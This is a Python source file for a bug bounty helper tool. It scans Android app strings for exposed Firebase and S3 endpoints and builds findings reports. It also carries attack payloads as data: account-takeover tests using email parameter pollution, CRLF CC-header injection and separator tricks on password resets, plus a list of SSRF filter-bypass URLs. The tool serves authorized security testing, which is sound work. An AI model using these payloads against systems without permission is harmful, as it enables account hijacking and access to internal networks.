"""
Bug Bounty Methodology Checker
Automated checks based on common bug bounty patterns and best practices
Integrates methodologies from bounty-notes
"""
import re
from pathlib import Path
from typing import Optional
from dataclasses import dataclass, field
from rich.console import Console

console = Console()


@dataclass
class BountyFinding:
    """Bug bounty finding"""
    category: str
    severity: str  # critical, high, medium, low, info
    title: str
    description: str
    location: str
    remediation: str
    references: list = field(default_factory=list)


class AndroidBountyChecker:
    """
    Android-specific bug bounty checks from bounty-notes
    """
    
    @staticmethod
    def check_firebase_exposure(strings: list[str]) -> list[BountyFinding]:
        """Check for Firebase database URLs"""
        findings = []
        
        firebase_pattern = r'https://([a-zA-Z0-9-]+)\.firebaseio\.com'
        
        for string in strings:
            matches = re.findall(firebase_pattern, string)
            for match in matches:
                findings.append(BountyFinding(
                    category="Data Exposure",
                    severity="high",
                    title="Firebase Realtime Database URL Found",
                    description=f"Found Firebase database URL: https://{match}.firebaseio.com",
                    location="Binary strings",
                    remediation="Test access: curl https://{match}.firebaseio.com/.json",
                    references=[
                        "https://firebase.google.com/docs/database/security",
                        "bounty-notes/android.md"
                    ]
                ))
        
        return findings
    
    @staticmethod
    def check_s3_buckets(strings: list[str]) -> list[BountyFinding]:
        """Check for S3 bucket references"""
        findings = []
        
        s3_patterns = [
            r's3\.amazonaws\.com/([a-zA-Z0-9\-\.]+)',
            r'([a-zA-Z0-9\-\.]+)\.s3\.amazonaws\.com',
            r's3://([a-zA-Z0-9\-\.]+)',
        ]
        
        for string in strings:
            for pattern in s3_patterns:
                matches = re.findall(pattern, string)
                for match in matches:
                    findings.append(BountyFinding(
                        category="Data Exposure",
                        severity="medium",
                        title="S3 Bucket Reference Found",
                        description=f"Found S3 bucket: {match}",
                        location="Binary strings",
                        remediation=f"Test access: aws s3 ls s3://{match}",
                        references=["bounty-notes/android.md"]
                    ))
        
        return findings
    
    @staticmethod
    def check_external_storage(manifest_content: str) -> list[BountyFinding]:
        """Check for external storage permissions"""
        findings = []
        
        if "android.permission.WRITE_EXTERNAL_STORAGE" in manifest_content:
            findings.append(BountyFinding(
                category="Insecure Storage",
                severity="medium",
                title="External Storage Write Permission",
                description="App requests WRITE_EXTERNAL_STORAGE permission",
                location="AndroidManifest.xml",
                remediation="Check if sensitive data is written to external storage",
                references=["bounty-notes/android.md"]
            ))
        
        # Check for getExternal* calls
        if "getExternal" in manifest_content:
            findings.append(BountyFinding(
                category="Insecure Storage",
                severity="low",
                title="External Storage API Usage",
                description="App uses getExternal* APIs",
                location="Source code",
                remediation="Verify no sensitive data is stored externally",
                references=[]
            ))
        
        return findings
    
    @staticmethod
    def check_package_installer(strings: list[str]) -> list[BountyFinding]:
        """Check for package installation capabilities"""
        findings = []
        
        if any("application/vnd.android.package-archive" in s for s in strings):
            findings.append(BountyFinding(
                category="Malicious Behavior",
                severity="high",
                title="APK Installation Capability",
                description="App can install other APKs",
                location="Binary strings",
                remediation="Verify legitimate use case for package installation",
                references=["bounty-notes/android.md"]
            ))
        
        return findings
    
    @staticmethod
    def check_encoded_strings(source_code: str) -> list[BountyFinding]:
        """Check for encoded strings that might hide secrets"""
        findings = []
        
        # Look for byte arrays
        byte_array_pattern = r'bytes?\s*\[\s*\d+.*?\]'
        matches = re.findall(byte_array_pattern, source_code)
        
        if matches:
            findings.append(BountyFinding(
                category="Obfuscation",
                severity="info",
                title="Encoded Byte Arrays Found",
                description=f"Found {len(matches)} byte array definitions",
                location="Source code",
                remediation="Decode byte arrays to check for hardcoded secrets",
                references=["bounty-notes/android.md"]
            ))
        
        return findings


class AccountTakeoverChecker:
    """
    Account takeover vulnerability checks from bounty-notes
    """
    
    CHECKS = {
        "registration_bypass": {
            "title": "Registration Username/Email Bypass",
            "description": "Test registration with spaces/case changes",
            "tests": [
                "Try: ' username' (leading space)",
                "Try: 'username ' (trailing space)",
                "Try: 'UsErNaMe' (case variation)"
            ]
        },
        "email_verification_bypass": {
            "title": "Email Verification Parameter Manipulation",
            "description": "Intercept email verification and change email parameter",
            "tests": [
                "Capture verification request",
                "Replace email with victim's email",
                "Check if verification applies to victim"
            ]
        },
        "password_reset_bypass": {
            "title": "Password Reset Token Manipulation",
            "description": "Intercept password reset and change email",
            "tests": [
                "Request reset for your account",
                "Intercept reset request",
                "Replace email with victim's",
                "Check if token works for victim"
            ]
        },
        "2fa_bypass": {
            "title": "2FA Email Parameter Manipulation",
            "description": "Change email during 2FA verification",
            "tests": [
                "Login and trigger 2FA",
                "Intercept 2FA request",
                "Replace email parameter",
                "Check if 2FA applies to victim"
            ]
        },
        "parameter_pollution": {
            "title": "Email Parameter Pollution",
            "description": "Add multiple email parameters",
            "tests": [
                "email=victim@xyz.tld&email=attacker@xyz.tld",
                "Check which email receives reset"
            ]
        },
        "carbon_copy": {
            "title": "Email Carbon Copy Injection",
            "description": "Inject CC header to get copy of reset email",
            "tests": [
                "email=victim@xyz.tld%0a%0dcc:attacker@xyz.tld",
                "Check if attacker receives copy"
            ]
        },
        "email_separators": {
            "title": "Email Separator Injection",
            "description": "Use separators to send to multiple recipients",
            "tests": [
                "email=victim@xyz.tld,attacker@xyz.tld",
                "email=victim@xyz.tld%20attacker@xyz.tld",
                "email=victim@xyz.tld|attacker@xyz.tld",
                '{"email": ["victim@xyz.tld","attacker@xyz.tld"]}'
            ]
        }
    }
    
    @classmethod
    def generate_checklist(cls) -> str:
        """Generate account takeover testing checklist"""
        checklist = "# Account Takeover Testing Checklist\n\n"
        
        for check_id, check_info in cls.CHECKS.items():
            checklist += f"## {check_info['title']}\n"
            checklist += f"{check_info['description']}\n\n"
            checklist += "**Tests:**\n"
            for test in check_info['tests']:
                checklist += f"- [ ] {test}\n"
            checklist += "\n"
        
        return checklist


class SSRFChecker:
    """
    SSRF vulnerability checks from bounty-notes
    """
    
    BYPASS_TECHNIQUES = {
        "encoding": [
            "Hex: 0x7f.0x0.0x0.0x1",
            "Octal: 0177.0.0.01",
            "URL: http://%31%32%37%2e%30%2e%30%2e%31",
            "Dword: http://2130706433",
            "Mixed: 0177.0.0.0x1"
        ],
        "dns_rebinding": [
            "nip.io: http://127.0.0.1.nip.io",
            "xip.io: http://127.0.0.1.xip.io",
            "1u.ms: http://127.0.0.1.1u.ms",
            "sslip.io: http://127-0-0-1.sslip.io"
        ],
        "blacklist_bypass": [
            "URL encode: %6c%6f%63%61%6c%68%6f%73%74",
            "IPv6: ::ffff:127.0.0.1",
            "Case mix: LoCaLhOsT",
            "Credentials: http://attacker@localhost",
            "Fragment: http://attacker#localhost"
        ]
    }
    
    @classmethod
    def generate_payloads(cls, target: str = "127.0.0.1") -> list[str]:
        """Generate SSRF bypass payloads"""
        payloads = []
        
        # Encoding variations
        payloads.extend([
            "0x7f.0x0.0x0.0x1",
            "0177.0.0.01",
            "http://%31%32%37%2e%30%2e%30%2e%31",
            "http://2130706433",
            "0177.0.0.0x1"
        ])
        
        # DNS rebinding
        payloads.extend([
            f"http://{target}.nip.io",
            f"http://{target}.xip.io",
            f"http://{target}.1u.ms",
            f"http://{target.replace('.', '-')}.sslip.io"
        ])
        
        # Blacklist bypass
        payloads.extend([
            "http://%6c%6f%63%61%6c%68%6f%73%74",
            "http://::ffff:127.0.0.1",
            "http://LoCaLhOsT",
            "http://attacker@localhost",
            "http://attacker#localhost"
        ])
        
        return payloads


class BountyMethodologyRunner:
    """
    Run all bounty methodology checks on an app
    """
    
    def __init__(self):
        self.android_checker = AndroidBountyChecker()
        self.account_checker = AccountTakeoverChecker()
        self.ssrf_checker = SSRFChecker()
    
    def check_android_app(self, strings: list[str], manifest: str = "", 
                          source_code: str = "") -> list[BountyFinding]:
        """Run all Android checks"""
        findings = []
        
        console.print("[bold cyan]═══ Bug Bounty Methodology Checks ═══[/bold cyan]\n")
        
        # Firebase
        console.print("[cyan]Checking Firebase exposure...[/cyan]")
        firebase_findings = self.android_checker.check_firebase_exposure(strings)
        findings.extend(firebase_findings)
        if firebase_findings:
            console.print(f"  [red]Found {len(firebase_findings)} Firebase URLs[/red]")
        
        # S3
        console.print("[cyan]Checking S3 buckets...[/cyan]")
        s3_findings = self.android_checker.check_s3_buckets(strings)
        findings.extend(s3_findings)
        if s3_findings:
            console.print(f"  [yellow]Found {len(s3_findings)} S3 references[/yellow]")
        
        # External storage
        if manifest:
            console.print("[cyan]Checking storage permissions...[/cyan]")
            storage_findings = self.android_checker.check_external_storage(manifest)
            findings.extend(storage_findings)
        
        # Package installer
        console.print("[cyan]Checking package installation...[/cyan]")
        pkg_findings = self.android_checker.check_package_installer(strings)
        findings.extend(pkg_findings)
        
        # Encoded strings
        if source_code:
            console.print("[cyan]Checking encoded strings...[/cyan]")
            encoded_findings = self.android_checker.check_encoded_strings(source_code)
            findings.extend(encoded_findings)
        
        # Summary
        critical = sum(1 for f in findings if f.severity == "critical")
        high = sum(1 for f in findings if f.severity == "high")
        medium = sum(1 for f in findings if f.severity == "medium")
        
        console.print(f"\n[bold]Findings: {len(findings)} total[/bold]")
        if critical:
            console.print(f"  [red]Critical: {critical}[/red]")
        if high:
            console.print(f"  [red]High: {high}[/red]")
        if medium:
            console.print(f"  [yellow]Medium: {medium}[/yellow]")
        
        return findings
    
    def generate_report(self, findings: list[BountyFinding]) -> str:
        """Generate bug bounty report"""
        report = "# Bug Bounty Methodology Report\n\n"
        
        # Group by severity
        by_severity = {}
        for f in findings:
            if f.severity not in by_severity:
                by_severity[f.severity] = []
            by_severity[f.severity].append(f)
        
        for severity in ["critical", "high", "medium", "low", "info"]:
            if severity not in by_severity:
                continue
            
            findings_list = by_severity[severity]
            icon = {"critical": "🔴", "high": "🟠", "medium": "🟡", "low": "🔵", "info": "⚪"}[severity]
            
            report += f"## {icon} {severity.upper()} ({len(findings_list)})\n\n"
            
            for f in findings_list:
                report += f"### {f.title}\n"
                report += f"**Category**: {f.category}\n\n"
                report += f"{f.description}\n\n"
                report += f"**Location**: {f.location}\n\n"
                report += f"**Remediation**: {f.remediation}\n\n"
                
                if f.references:
                    report += "**References**:\n"
                    for ref in f.references:
                        report += f"- {ref}\n"
                    report += "\n"
        
        return report
    
    def export_account_takeover_checklist(self, output_path: str) -> str:
        """Export account takeover testing checklist"""
        checklist = self.account_checker.generate_checklist()
        
        with open(output_path, "w") as f:
            f.write(checklist)
        
        console.print(f"[green]Checklist exported: {output_path}[/green]")
        return output_path
    
    def export_ssrf_payloads(self, output_path: str, target: str = "127.0.0.1") -> str:
        """Export SSRF bypass payloads"""
        payloads = self.ssrf_checker.generate_payloads(target)
        
        with open(output_path, "w") as f:
            f.write("# SSRF Bypass Payloads\n\n")
            for payload in payloads:
                f.write(f"{payload}\n")
        
        console.print(f"[green]Payloads exported: {output_path}[/green]")
        return output_path


if __name__ == "__main__":
    runner = BountyMethodologyRunner()
    
    # Test
    test_strings = [
        "https://my-app-12345.firebaseio.com",
        "s3.amazonaws.com/my-bucket",
        "application/vnd.android.package-archive"
    ]
    
    findings = runner.check_android_app(test_strings)
    
    console.print("\n" + runner.generate_report(findings))
